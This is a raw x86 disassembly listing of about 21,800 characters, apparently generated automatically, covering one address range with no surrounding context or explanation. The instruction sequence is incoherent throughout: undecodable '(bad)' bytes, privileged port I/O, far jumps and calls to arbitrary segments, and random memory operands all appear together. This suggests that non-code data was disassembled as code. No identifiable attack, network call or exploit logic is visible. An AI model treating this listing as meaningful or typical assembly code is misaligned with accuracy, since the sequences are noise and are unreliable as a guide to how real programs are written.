  41b757:	push   esi
  41b758:	add    BYTE PTR [edi+0x39f615f5],dh
  41b75e:	mov    dl,0x63
  41b760:	lea    esi,[eax+0x6cb7e25d]
  41b766:	aam    0x20
  41b768:	mov    ch,0x46
  41b76a:	inc    esi
  41b76b:	retf   
  41b76c:	sbb    ch,BYTE PTR [ebx+edx*2-0x13]
  41b770:	in     eax,0xf8
  41b772:	xchg   DWORD PTR [eax+0x1b],edi
  41b775:	imul   DWORD PTR ds:0x17980e1f
  41b77b:	sbb    BYTE PTR [ecx+0xb52f975],cl
  41b781:	xchg   DWORD PTR [edx],esi
  41b783:	sbb    DWORD PTR [ecx],esi
  41b785:	fcomp  DWORD PTR [ecx+0x48d8879b]
  41b78b:	repz dec ecx
  41b78d:	mov    ds:0xe74be76f,eax
  41b792:	leave  
  41b793:	dec    esp
  41b794:	shr    DWORD PTR [esi+0x692d321c],1
  41b79a:	push   eax
  41b79b:	mov    ebx,DWORD PTR [eax]
  41b79d:	stos   BYTE PTR es:[edi],al
  41b79e:	jg     0x41b7a3
  41b7a0:	fnstsw WORD PTR ds:0x1b5f7cc
  41b7a6:	and    ah,BYTE PTR [ebx+0x542156ee]
  41b7ac:	das    
  41b7ad:	jb     0x41b7c7
  41b7af:	(bad)
  41b7b2:	xor    edi,DWORD PTR [ebx-0x6dbeb317]
  41b7b8:	push   esi
  41b7b9:	rcl    DWORD PTR [esp+edi*2],0x0
  41b7bd:	pusha  
  41b7be:	adc    DWORD PTR [edi-0x3edc3eb],edx
  41b7c4:	inc    ecx
  41b7c5:	adc    BYTE PTR [esi],bl
  41b7c7:	adc    al,0xaf
  41b7c9:	sub    ah,BYTE PTR [ebx+0x3e]
  41b7cc:	sub    BYTE PTR [eax+0x52],0x49
  41b7d0:	mov    ah,0x92
  41b7d2:	and    ebp,DWORD PTR [esi-0x5c4357be]
  41b7d8:	xchg   BYTE PTR [eax],ch
  41b7da:	pop    ds
  41b7db:	int3   
  41b7dc:	sub    eax,0x22dfbf3c
  41b7e1:	and    bl,BYTE PTR [edi+0x71]
  41b7e4:	add    dh,BYTE PTR [ebx-0x1]
  41b7e7:	ret    
  41b7e8:	pop    eax
  41b7e9:	js     0x41b7b7
  41b7eb:	mov    es,WORD PTR [esi+0x5c]
  41b7ee:	jae    0x41b77a
  41b7f0:	mul    DWORD PTR [edx-0x37]
  41b7f3:	xchg   ecx,eax
  41b7f4:	rol    BYTE PTR [ebx+ecx*8-0x8],0xcb
  41b7f9:	and    BYTE PTR [edi+edx*2-0x1a],ch
  41b7fd:	clc    
  41b7fe:	sahf   
  41b7ff:	add    ebp,DWORD PTR [ebp-0x592c7808]
  41b805:	popf   
  41b806:	adc    DWORD PTR [eax+0x4d],eax
  41b809:	dec    ebx
  41b80a:	sub    al,0x7d
  41b80c:	xchg   ecx,eax
  41b80d:	pop    esi
  41b80e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b80f:	jbe    0x41b7c4
  41b811:	xchg   ebx,eax
  41b812:	xor    BYTE PTR [eax],cl
  41b814:	loope  0x41b7f3
  41b816:	fimul  DWORD PTR [ecx+0x30]
  41b819:	mov    BYTE PTR [ebp+edx*4-0x2e3fd83e],al
  41b820:	dec    eax
  41b821:	ja     0x41b7f4
  41b823:	idiv   DWORD PTR [ebp-0x10]
  41b826:	fmul   st(1),st
  41b828:	fxch   st(1)
  41b82a:	gs (bad) 
  41b82c:	data16 lahf 
  41b82e:	cld    
  41b82f:	cmp    dl,0x5a
  41b832:	cmp    al,0x19
  41b834:	cwde   
  41b835:	inc    edi
  41b836:	xlat   BYTE PTR ds:[ebx]
  41b837:	and    ebp,esp
  41b839:	or     dl,ch
  41b83b:	dec    esi
  41b83c:	jecxz  0x41b7e2
  41b83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b83f:	int3   
  41b840:	std    
  41b841:	or     ecx,DWORD PTR [ecx-0x5b]
  41b844:	(bad)  [edx+0x3a0ad70]
  41b84a:	inc    esi
  41b84b:	xchg   esp,eax
  41b84c:	push   eax
  41b84d:	outs   dx,BYTE PTR ds:[esi]
  41b84e:	adc    eax,0x5b7e3c73
  41b853:	pop    eax
  41b854:	xor    DWORD PTR [edi+0x23d6206d],0x68
  41b85b:	arpl   bp,dx
  41b85d:	mov    DWORD PTR [eax-0x6685cb64],esi
  41b863:	adc    edx,DWORD PTR [edx-0x2663be9f]
  41b869:	mov    ecx,0x53fbd5a6
  41b86e:	sub    DWORD PTR [eax-0xed6a106],edx
  41b874:	pop    edi
  41b875:	stc    
  41b876:	retf   
  41b877:	inc    ebx
  41b878:	mov    bl,ah
  41b87a:	add    al,0xb9
  41b87c:	push   esi
  41b87d:	cmp    DWORD PTR [edi-0x7a3ca356],0x13893935
  41b887:	mov    ch,0xdf
  41b889:	inc    esp
  41b88a:	or     al,0xd5
  41b88c:	xchg   ebx,eax
  41b88d:	jne    0x41b8da
  41b88f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b890:	add    eax,0x81c6e88e
  41b895:	sbb    BYTE PTR [eax+ecx*4],cl
  41b898:	pop    ss
  41b899:	jmp    0x41b8f7
  41b89b:	call   0x6431:0x1297862
  41b8a2:	fwait
  41b8a3:	adc    DWORD PTR [edx-0x31b8ba8e],esi
  41b8a9:	es xchg ebx,eax
  41b8ab:	mov    ah,0x58
  41b8ad:	fimul  WORD PTR [ebx]
  41b8af:	(bad)
  41b8b3:	dec    ecx
  41b8b4:	jno    0x41b859
  41b8b6:	aas    
  41b8b7:	xchg   ebp,eax
  41b8b8:	loope  0x41b8c7
  41b8ba:	(bad)  
  41b8bb:	push   ebx
  41b8bc:	jno    0x41b8d9
  41b8be:	int3   
  41b8bf:	cmp    eax,0xc23a8cb7
  41b8c4:	xor    edi,ebp
  41b8c6:	dec    ecx
  41b8c7:	xlat   BYTE PTR ds:[ebx]
  41b8c8:	xor    dl,dl
  41b8ca:	cmp    ebx,ebx
  41b8cc:	popf   
  41b8cd:	out    dx,ax
  41b8cf:	jmp    DWORD PTR [esi]
  41b8d1:	fmul   st(7),st
  41b8d3:	(bad)  
  41b8d4:	lock xor BYTE PTR [edx-0xac174a9],al
  41b8db:	xor    BYTE PTR [ebp-0x7],dl
  41b8de:	mov    cl,0xbd
  41b8e0:	les    ebx,FWORD PTR [eax-0x3335b635]
  41b8e6:	imul   ecx,DWORD PTR ds:0x4a5cdfdf,0x78d5c99e
  41b8f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8f1:	cmp    edi,ebp
  41b8f3:	xchg   ebp,eax
  41b8f4:	test   al,0x51
  41b8f6:	mov    ebp,eax
  41b8f8:	es (bad) 
  41b8fa:	and    ch,BYTE PTR [esi]
  41b8fc:	mov    dl,0x50
  41b8fe:	in     al,0x35
  41b900:	rcl    DWORD PTR [edi-0x5e],0x56
  41b904:	or     al,0x39
  41b906:	cmp    eax,DWORD PTR [edi-0x6c]
  41b909:	xlat   BYTE PTR ds:[ebx]
  41b90a:	adc    cl,BYTE PTR [ecx+edi*8-0x66]
  41b90e:	sub    BYTE PTR [edx+edx*2],cl
  41b911:	(bad)  
  41b912:	jno    0x41b966
  41b914:	adc    DWORD PTR [ecx-0x74fd50f1],edi
  41b91a:	push   ebp
  41b91b:	cld    
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx+0x1a852136]
  41b92f:	aad    0xac
  41b931:	lock out 0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b8f9
  41b93a:	pop    ebp
  41b93b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b93c:	mov    cl,0x45
  41b93e:	xchg   ecx,eax
  41b93f:	stc    
  41b940:	adc    eax,0x8591a016
  41b945:	push   cs
  41b946:	mov    edi,0xb307819b
  41b94b:	loopne 0x41b8fe
  41b94d:	daa    
  41b94e:	outs   dx,BYTE PTR ds:[esi]
  41b94f:	xor    al,bh
  41b951:	shr    DWORD PTR es:[ebp+ebp*8-0x57],1
  41b956:	pop    ecx
  41b957:	xor    ebx,DWORD PTR [edi+edx*1]
  41b95a:	loopne 0x41b95a
  41b95c:	xchg   edx,eax
  41b95d:	js     0x41b9d1
  41b95f:	push   0xfffffff3
  41b961:	inc    edi
  41b962:	xchg   ebp,eax
  41b963:	pop    ss
  41b964:	outs   dx,BYTE PTR ds:[esi]
  41b965:	cmc    
  41b966:	or     BYTE PTR [ecx-0x66],0x83
  41b96a:	das    
  41b96b:	stc    
  41b96c:	iret   
  41b96d:	gs cld 
  41b96f:	test   al,0xc7
  41b972:	xchg   edx,eax
  41b973:	jns    0x41b9c9
  41b975:	fcom   QWORD PTR [esi]
  41b977:	mov    edx,0x22e9e5ce
  41b97c:	das    
  41b97d:	mov    al,ds:0xcf279fa2
  41b982:	mov    edx,0xc3fe10a2
  41b987:	popa   
  41b988:	aad    0xa6
  41b98a:	loop   0x41b9aa
  41b98c:	daa    
  41b98d:	jl     0x41b95a
  41b98f:	leave  
  41b990:	mov    ebp,0xc9d3562f
  41b995:	adc    eax,0x907dc0f2
  41b99a:	es js  0x41ba16
  41b99d:	mov    bl,0x2a
  41b99f:	retf   0xc702
  41b9a2:	or     al,0xc4
  41b9a4:	js     0x41b949
  41b9a6:	jle    0x41b982
  41b9a8:	and    eax,0x940dafde
  41b9ad:	mov    edx,0xd27f8094
  41b9b2:	inc    eax
  41b9b3:	sub    eax,0x59f391e8
  41b9b8:	je     0x41b984
  41b9ba:	push   esi
  41b9bb:	and    edx,edi
  41b9bd:	jno    0x41b95e
  41b9bf:	add    BYTE PTR [esi+0x41],ah
  41b9c2:	loop   0x41b9e8
  41b9c4:	fmul   st,st(3)
  41b9c6:	and    ebp,DWORD PTR [ebx+edx*8]
  41b9c9:	pop    esi
  41b9ca:	xchg   edi,eax
  41b9cb:	mov    ds:0x654e0c2b,al
  41b9d0:	sub    eax,0x4b7048b7
  41b9d5:	mov    cl,0x85
  41b9d7:	inc    edi
  41b9d8:	(bad)  
  41b9d9:	xchg   esp,eax
  41b9da:	aam    0x15
  41b9dc:	inc    ebx
  41b9dd:	pop    ebx
  41b9de:	aaa    
  41b9df:	xchg   esp,eax
  41b9e0:	scas   al,BYTE PTR es:[edi]
  41b9e1:	retf   0x5f76
  41b9e4:	call   0xad1c:0xeacdd964
  41b9eb:	(bad)  
  41b9ed:	jae    0x41ba5b
  41b9ef:	xchg   ecx,eax
  41b9f0:	test   DWORD PTR [edi],edx
  41b9f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9f3:	jo     0x41b9b6
  41b9f5:	or     DWORD PTR [eax-0x38],esi
  41b9f8:	add    al,0xe0
  41b9fa:	inc    esp
  41b9fb:	in     al,0x3f
  41b9fd:	(bad)  
  41b9fe:	inc    ebx
  41b9ff:	mov    bl,0x72
  41ba01:	aas    
  41ba02:	add    DWORD PTR [esi+ebx*2],ecx
  41ba05:	ds popf 
  41ba07:	mov    al,ds:0x73762c7c
  41ba0c:	mov    ebx,DWORD PTR [ecx+edi*2-0x6aa7a357]
  41ba13:	hlt    
  41ba14:	mov    ds:0xd625c68a,al
  41ba19:	fild   QWORD PTR [eax]
  41ba1b:	push   esp
  41ba1c:	aas    
  41ba1d:	mov    al,ds:0xb7ae2bd5
  41ba22:	adc    eax,0x74282ff3
  41ba27:	out    dx,al
  41ba28:	nop
  41ba29:	jo     0x41ba37
  41ba2b:	fstp   DWORD PTR [edi]
  41ba2d:	sub    al,0x45
  41ba2f:	xor    al,0x89
  41ba31:	out    dx,al
  41ba32:	mov    eax,ds:0xa4e5d654
  41ba37:	fwait
  41ba38:	push   ebp
  41ba39:	add    DWORD PTR [eax-0x37],esi
  41ba3c:	clc    
  41ba3d:	fisub  WORD PTR [esi-0x5d]
  41ba40:	add    BYTE PTR [ecx],ah
  41ba42:	dec    eax
  41ba43:	mov    al,0xc4
  41ba45:	ret    0x4211
  41ba48:	mov    bl,0xaa
  41ba4a:	out    0x55,eax
  41ba4c:	add    ebx,DWORD PTR [esi+0x518bf4d]
  41ba52:	jge    0x41bab2
  41ba54:	jmp    0x41b9ef
  41ba56:	fnsave [edi]
  41ba58:	pop    ecx
  41ba59:	bound  eax,QWORD PTR [ebx]
  41ba5b:	lea    edx,[ebp-0x7deb62d]
  41ba61:	(bad)  
  41ba62:	jb     0x41ba88
  41ba64:	fcomp  DWORD PTR [edx+ebp*2-0x5978e1aa]
  41ba6b:	inc    edi
  41ba6c:	ss mov es,edi
  41ba6f:	(bad)  
  41ba70:	mov    esp,0x9a5ffbde
  41ba75:	or     DWORD PTR [eax-0x63],edx
  41ba78:	xchg   dl,ah
  41ba7a:	fsub   QWORD PTR [edx+esi*8]
  41ba7d:	xor    al,0xdd
  41ba7f:	out    0x2,eax
  41ba81:	popa   
  41ba82:	and    BYTE PTR [edi-0x53717949],0x88
  41ba89:	ret    
  41ba8a:	test   BYTE PTR [ebx-0x19],ch
  41ba8d:	push   ds
  41ba8e:	jmp    0x834c:0x914ff5bd
  41ba95:	rcl    BYTE PTR [ebx+ebp*2],cl
  41ba98:	inc    esp
  41ba99:	jb     0x41bb14
  41ba9b:	stc    
  41ba9c:	data16 and al,0xb2
  41ba9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baa0:	pop    esi
  41baa1:	test   DWORD PTR [ebp+0x7456e13b],esi
  41baa7:	data16 sub BYTE PTR [ecx],ah
  41baaa:	popf   
  41baab:	inc    DWORD PTR [ebp-0x5d81e225]
  41bab1:	cmc    
  41bab2:	outs   dx,BYTE PTR ds:[esi]
  41bab3:	das    
  41bab4:	mov    dh,0xdb
  41bab6:	inc    esi
  41bab7:	xor    esp,DWORD PTR [esi+esi*4-0x59]
  41babb:	lds    edx,FWORD PTR [esi]
  41babd:	push   edx
  41babe:	ins    BYTE PTR es:[edi],dx
  41babf:	add    edx,esi
  41bac1:	push   ebp
  41bac2:	xor    eax,0xcabaff94
  41bac7:	xor    esp,DWORD PTR [ecx-0xd]
  41baca:	xchg   esi,eax
  41bacb:	std    
  41bacc:	mov    al,0x4
  41bace:	popa   
  41bacf:	or     DWORD PTR [ebx+ebx*4+0x60],edx
  41bad3:	sub    eax,0x9fff6eb8
  41bad8:	ins    DWORD PTR es:[edi],dx
  41bad9:	sbb    DWORD PTR [edx+0x1c24e2bb],ecx
  41badf:	in     eax,0x3a
  41bae1:	inc    ebx
  41bae2:	leave  
  41bae3:	fsub   QWORD PTR ds:0x8c639dc6
  41bae9:	call   0x5275dcdf
  41baee:	mov    eax,0xcc3b040c
  41baf3:	xor    BYTE PTR [edi-0x41171c43],bl
  41baf9:	cs inc esp
  41bafb:	pop    ecx
  41bafc:	inc    ebx
  41bafd:	fdivr  QWORD PTR [ebp-0x68]
  41bb00:	(bad)  
  41bb01:	push   ebp
  41bb02:	data16 idiv BYTE PTR [eax]
  41bb05:	push   eax
  41bb06:	leave  
  41bb07:	mov    ds:0x31c8a31e,al
  41bb0c:	fidivr DWORD PTR [ecx-0x506f2544]
  41bb12:	inc    ebp
  41bb13:	fisub  DWORD PTR [eax-0x9]
  41bb16:	xor    eax,0x70ac7770
  41bb1b:	(bad)  
  41bb1c:	xor    DWORD PTR [ecx],esp
  41bb1e:	jmp    0x9c8bf921
  41bb23:	test   BYTE PTR [eax+edi*1+0x59fc033a],ah
  41bb2a:	mov    ss,WORD PTR [ecx-0x13fb7c6a]
  41bb30:	(bad)  
  41bb31:	lock mov ecx,0xcaa0106f
  41bb37:	(bad)  
  41bb38:	mov    ah,0xe5
  41bb3a:	jbe    0x41bb55
  41bb3c:	(bad)  
  41bb3d:	cmp    al,0xe0
  41bb3f:	leave  
  41bb40:	push   eax
  41bb41:	mov    ebx,0xb4001fb9
  41bb46:	imul   edx,DWORD PTR [esi+0xd0363fb],0xffffffb6
  41bb4d:	jnp    0x41bb3b
  41bb4f:	jmp    0x230:0xe9d13384
  41bb56:	add    BYTE PTR [eax],al
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0x5017bf12
  41bb65:	(bad)  
  41bb66:	mov    dh,0xb1
  41bb68:	mov    ah,ah
  41bb6a:	jg     0x41bbe4
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41bb27
  41bb71:	in     al,dx
  41bb72:	pop    esi
  41bb73:	lock shl DWORD PTR [edx-0xd],cl
  41bb77:	dec    edx
  41bb78:	add    esp,ebx
  41bb7a:	jl     0x41bbec
  41bb7c:	pop    edx
  41bb7d:	pop    DWORD PTR [edx]
  41bb7f:	jl     0x41bb58
  41bb81:	loopne 0x41bb5c
  41bb83:	mov    ecx,0xf62d9162
  41bb88:	jle    0x41bbee
  41bb8a:	push   DWORD PTR [eax+0x3db2668f]
  41bb90:	xor    edx,eax
  41bb92:	push   ebp
  41bb93:	cmp    dl,bl
  41bb95:	xchg   ebp,eax
  41bb96:	pop    di
  41bb98:	cmc    
  41bb99:	(bad)  
  41bb9b:	mov    ah,0xd7
  41bb9d:	hlt    
  41bb9e:	jmp    0xd0cf3252
  41bba3:	pop    es
  41bba4:	sbb    bh,BYTE PTR [ebx]
  41bba6:	adc    al,0x9f
  41bba8:	and    DWORD PTR [esi+0xb53294e],ebp
  41bbae:	sbb    edi,DWORD PTR [esi-0x78]
  41bbb1:	repnz sbb al,0x86
  41bbb4:	out    0x86,al
  41bbb6:	lock dec ebp
  41bbb8:	sub    DWORD PTR [edi],0x14
  41bbbb:	lds    esp,FWORD PTR [eax]
  41bbbd:	je     0x41bb9c
  41bbbf:	dec    edx
  41bbc0:	jb     0x41bc07
  41bbc2:	and    DWORD PTR [edx+0x52],0x55
  41bbc6:	sbb    al,0xe3
  41bbc8:	or     eax,0x17e9cdc9
  41bbcd:	or     BYTE PTR [ecx-0x1dbe5b3c],bl
  41bbd3:	retf   
  41bbd4:	pop    es
  41bbd5:	nop
  41bbd6:	ins    BYTE PTR es:[edi],dx
  41bbd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbd8:	bt     DWORD PTR [ebx],eax
  41bbdb:	xchg   esp,eax
  41bbdc:	cmp    al,0x89
  41bbde:	xchg   esi,eax
  41bbdf:	nop
  41bbe0:	popf   
  41bbe1:	mov    eax,ds:0x3451fdcb
  41bbe6:	xor    cl,dl
  41bbe8:	push   ss
  41bbe9:	in     eax,dx
  41bbea:	adc    DWORD PTR [ebx],esp
  41bbec:	sbb    eax,0xd0d97365
  41bbf1:	add    ebx,DWORD PTR [ebp+0x44]
  41bbf4:	lds    edx,FWORD PTR [ebx+ebp*4]
  41bbf7:	xlat   BYTE PTR ds:[ebx]
  41bbf8:	int3   
  41bbf9:	mov    eax,0xccd6a40f
  41bbfe:	xchg   edi,eax
  41bbff:	loopne 0x41bbb4
  41bc01:	push   ebp
  41bc02:	lds    ecx,FWORD PTR [ebx]
  41bc04:	jbe    0x41bc7f
  41bc06:	xor    al,0xcd
  41bc08:	jmp    0x9bf3f92b
  41bc0d:	and    ch,BYTE PTR fs:[esi+0x338b2a90]
  41bc14:	inc    eax
  41bc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc16:	xchg   esi,eax
  41bc17:	icebp  
  41bc18:	push   edx
  41bc19:	push   0x39
  41bc1b:	int3   
  41bc1c:	inc    ebx
  41bc1d:	pop    edi
  41bc1e:	loop   0x41bc52
  41bc20:	test   DWORD PTR [esi-0x27],0x22d3674c
  41bc27:	xor    dh,bl
  41bc29:	push   esi
  41bc2a:	shl    BYTE PTR [ecx-0x2f6eb665],1
  41bc30:	into   
  41bc31:	aad    0x85
  41bc33:	es popa 
  41bc35:	sbb    DWORD PTR [ebp-0x4b],ebx
  41bc38:	pushf  
  41bc39:	adc    BYTE PTR [ebp-0x58],dl
  41bc3c:	lods   al,BYTE PTR ds:[esi]
  41bc3d:	lods   eax,DWORD PTR ds:[esi]
  41bc3e:	cwde   
  41bc3f:	jb     0x41bc94
  41bc41:	fiadd  WORD PTR [ebx-0x2a1de158]
  41bc47:	cmp    BYTE PTR [ebp+0x47],ah
  41bc4a:	in     eax,dx
  41bc4b:	jg     0x41bc8b
  41bc4d:	mov    DWORD PTR [edi-0x3c4438c7],0x73924277
  41bc57:	mov    eax,0xc6515cee
  41bc5c:	lea    ecx,[esi-0x3d]
  41bc5f:	(bad)  
  41bc60:	sub    dh,bl
  41bc62:	hlt    
  41bc63:	popa   
  41bc64:	(bad)  
  41bc65:	cmc    
  41bc66:	(bad)  
  41bc67:	ss and esp,edx
  41bc6a:	fimul  DWORD PTR [esi+0x72]
  41bc6d:	jno    0x41bc42
  41bc6f:	pop    esp
  41bc70:	out    dx,al
  41bc71:	mov    esp,0xf02f006c
  41bc76:	test   DWORD PTR [ecx+ebp*2+0x2f],ebx
  41bc7a:	or     ecx,DWORD PTR [ecx-0x4d]
  41bc7d:	mov    ds:0xc08951f6,eax
  41bc82:	neg    BYTE PTR [esi+edx*8]
  41bc85:	mov    eax,0x4b5fe4b1
  41bc8a:	push   ds
  41bc8b:	aas    
  41bc8c:	shl    eax,1
  41bc8e:	sub    DWORD PTR [edx-0x34],esi
  41bc91:	mov    ch,0xbc
  41bc93:	push   0xb0b878c5
  41bc98:	xchg   edx,eax
  41bc99:	or     BYTE PTR [esp+edx*2-0x38004a4d],al
  41bca0:	sub    eax,0x54aa0d6
  41bca5:	push   0xffffffb1
  41bca7:	cmp    DWORD PTR [edx-0x11a17344],ecx
  41bcad:	mov    ecx,0xaa48513d
  41bcb2:	outs   dx,DWORD PTR ds:[esi]
  41bcb3:	cmc    
  41bcb4:	push   0xdfbb23fe
  41bcb9:	test   BYTE PTR [ebx+0x6a],cl
  41bcbc:	push   eax
  41bcbd:	jbe    0x41bc4b
  41bcbf:	mov    ds:0x8b0435ec,eax
  41bcc4:	outs   dx,BYTE PTR ds:[esi]
  41bcc5:	jns    0x41bcb0
  41bcc7:	sbb    edx,ecx
  41bcc9:	mov    al,0xb8
  41bccb:	push   ds
  41bccc:	seta   BYTE PTR [ecx+ebp*4+0x20]
  41bcd1:	imul   ebx,DWORD PTR [ebx],0x4e20379c
  41bcd7:	rcr    DWORD PTR [edx+0x49325f01],1
  41bcdd:	mov    esi,0xdc7522f9
  41bce2:	into   
  41bce3:	add    ecx,DWORD PTR [edx-0x65344607]
  41bce9:	sbb    dh,bh
  41bceb:	test   eax,0xdc6320a
  41bcf0:	inc    ebx
  41bcf1:	shl    BYTE PTR [edi-0x1c],0x80
  41bcf5:	shr    esi,cl
  41bcf7:	cmp    esi,DWORD PTR [edi-0x80]
  41bcfa:	sub    BYTE PTR [esi+0x60],dl
  41bcfd:	cli    
  41bcfe:	ficomp DWORD PTR [edx-0x51723fca]
  41bd04:	dec    edx
  41bd05:	std    
  41bd06:	sub    al,0x60
  41bd08:	sahf   
  41bd09:	sti    
  41bd0a:	bound  ebx,QWORD PTR [edx+0x4aab499b]
  41bd10:	retf   
  41bd11:	xchg   esi,eax
  41bd12:	xor    al,BYTE PTR [eax]
  41bd14:	xor    ecx,DWORD PTR [esi-0x51979cb6]
  41bd1a:	mov    al,ds:0x9575f64a
  41bd1f:	xor    DWORD PTR [ebp+0x55],esi
  41bd22:	dec    edx
  41bd23:	test   DWORD PTR [ebx+0x8],eax
  41bd26:	pop    edx
  41bd27:	nop
  41bd28:	jge    0x41bd72
  41bd2a:	mov    ebp,0x5965231
  41bd2f:	add    DWORD PTR ds:0x5fcd47a3,edi
  41bd35:	or     DWORD PTR [esi+ecx*8+0x61],ecx
  41bd39:	les    edi,FWORD PTR [ecx-0x7e]
  41bd3c:	js     0x41bd1a
  41bd3e:	cwde   
  41bd3f:	mov    edi,0xfe911d9d
  41bd44:	sbb    dl,ch
  41bd46:	pushf  
  41bd47:	scas   eax,DWORD PTR es:[edi]
  41bd48:	aad    0x0
  41bd4a:	ret    
  41bd4b:	repz sar BYTE PTR [edx-0x46852e4a],0xf0
  41bd53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd54:	mov    esp,0xad42dc25
  41bd59:	cmp    BYTE PTR [edi],bl
  41bd5b:	cmp    ebx,DWORD PTR [eax+ebx*1]
  41bd5e:	dec    edx
  41bd60:	pop    ecx
  41bd61:	repnz cwde 
  41bd63:	je     0x41bd92
  41bd65:	out    dx,eax
  41bd66:	icebp  
  41bd67:	sahf   
  41bd68:	mov    ds:0x9e467d5a,eax
  41bd6d:	sbb    ebp,edi
  41bd6f:	adc    DWORD PTR [ebx-0x1a],ecx
  41bd72:	mov    ah,0x3e
  41bd74:	mov    ds:0x907e473f,eax
  41bd79:	loope  0x41bd72
  41bd7b:	dec    ebp
  41bd7c:	and    BYTE PTR [ecx+0x3e],0x3e
  41bd80:	adc    eax,0xbe3482ca
  41bd85:	out    dx,al
  41bd86:	jg     0x41be02
  41bd88:	mov    ecx,DWORD PTR [ebp+0x8]
  41bd8b:	jmp    0x41bfc0
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0xffffffcb
  41bd9d:	fwait
  41bd9e:	and    ecx,esi
  41bda0:	mov    al,ds:0x10787fea
  41bda5:	jle    0x41be1f
  41bda7:	js     0x41bd9f
  41bda9:	retf   
  41bdaa:	ss test al,cl
  41bdad:	xor    DWORD PTR [edi],esi
  41bdaf:	ror    BYTE PTR [ebx+0x3],0xd2
  41bdb3:	pop    edi
  41bdb4:	push   esi
  41bdb5:	lea    ecx,[edx+0x2b0a27cc]
  41bdbb:	cmc    
  41bdbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdbd:	jns    0x41bdbf
  41bdbf:	aam    0x95
  41bdc1:	lods   eax,DWORD PTR ds:[esi]
  41bdc2:	cdq    
  41bdc3:	pop    ebp
  41bdc4:	adc    eax,0xa07d68e7
  41bdc9:	and    eax,0x3e079eba
  41bdce:	jo     0x41bd84
  41bdd0:	test   BYTE PTR [edi-0x7a36aa4f],dh
  41bdd6:	dec    edx
  41bdd7:	pop    esi
  41bdd8:	jb     0x41bd9a
  41bdda:	add    dl,BYTE PTR [eax+0x77896889]
  41bde0:	dec    esi
  41bde1:	arpl   WORD PTR [eax],bp
  41bde3:	and    ch,bl
  41bde5:	out    dx,eax
  41bde6:	and    eax,ebx
  41bde8:	jg     0x41be4c
  41bdea:	push   ebp
  41bdeb:	popa   
  41bdec:	fld    DWORD PTR ds:[ebx-0x5aefd059]
  41bdf3:	dec    ecx
  41bdf4:	jno    0x41be0f
  41bdf6:	sub    eax,0x38929fd0
  41bdfb:	cmp    esi,ebp
  41bdfd:	jno    0x41bdee
  41bdff:	adc    eax,0xf3de4511
  41be04:	and    DWORD PTR [edi],esp
  41be06:	fcmovb st,st(4)
  41be08:	or     DWORD PTR ds:0xb1ea02b7,edi
  41be0e:	addr16 push 0xffffffe2
  41be11:	cmp    al,0xd3
  41be13:	mov    bl,0x89
  41be15:	and    al,0xc3
  41be17:	out    0x9e,al
  41be19:	aad    0xa7
  41be1b:	dec    esi
  41be1c:	out    dx,eax
  41be1d:	stc    
  41be1e:	jbe    0x41be4e
  41be20:	jmp    DWORD PTR [esi-0x154efae0]
  41be26:	mov    esp,0xe30e3be7
  41be2b:	cwde   
  41be2c:	jns    0x41be6b
  41be2e:	cmp    DWORD PTR ds:0x286c423b,esp
  41be34:	(bad)  
  41be35:	sar    BYTE PTR [esi+0x2604cc8b],cl
  41be3b:	pop    ds
  41be3c:	int    0x0
  41be3e:	ds int 0xad
  41be41:	xchg   edx,eax
  41be42:	xchg   ecx,eax
  41be43:	and    al,0xe3
  41be45:	scas   eax,DWORD PTR es:[edi]
  41be46:	retf   
  41be47:	jae    0x41be7d
  41be49:	mov    dh,0xe8
  41be4b:	mov    al,ds:0x3f98e067
  41be50:	sbb    BYTE PTR [esi],ah
  41be52:	pop    edi
  41be53:	sub    esp,DWORD PTR [eax]
  41be55:	sub    DWORD PTR [eax],esp
  41be57:	nop
  41be58:	adc    eax,0x103a47b8
  41be5d:	cmp    dl,0xbc
  41be60:	hlt    
  41be61:	(bad)  
  41be62:	in     eax,0x25
  41be64:	mov    eax,0xb8b051a2
  41be69:	pop    es
  41be6a:	mov    ch,0x30
  41be6c:	ins    DWORD PTR es:[edi],dx
  41be6d:	fstp   DWORD PTR [ecx-0x65]
  41be70:	inc    edx
  41be71:	push   ds
  41be72:	ret    0xd516
  41be75:	lock iret 
  41be77:	leave  
  41be78:	push   ebp
  41be79:	or     al,0xa9
  41be7b:	xchg   ebx,eax
  41be7c:	call   0xec7f:0xacc2b21b
  41be83:	cmp    eax,0x7de86359
  41be88:	data16 outs dx,BYTE PTR ds:[esi]
  41be8a:	test   BYTE PTR [edi+0x73],0x47
  41be8e:	add    ch,BYTE PTR [edx+0x2b]
  41be91:	hlt    
  41be92:	and    BYTE PTR [edi-0x2932ee5b],ch
  41be98:	iret   
  41be99:	shr    ch,1
  41be9b:	mov    ds:0x9194d26a,eax
  41bea0:	sti    
  41bea1:	fsub   DWORD PTR [eax*1-0x4299ab55]
  41bea8:	mov    bl,0x96
  41beaa:	cmp    BYTE PTR [ebp+0x5e],ah
  41bead:	dec    esp
  41beae:	ret    
  41beaf:	pop    eax
  41beb0:	mov    ebp,edi
  41beb2:	sbb    eax,0xe485949c
  41beb7:	sub    edx,DWORD PTR [ebx+0x58]
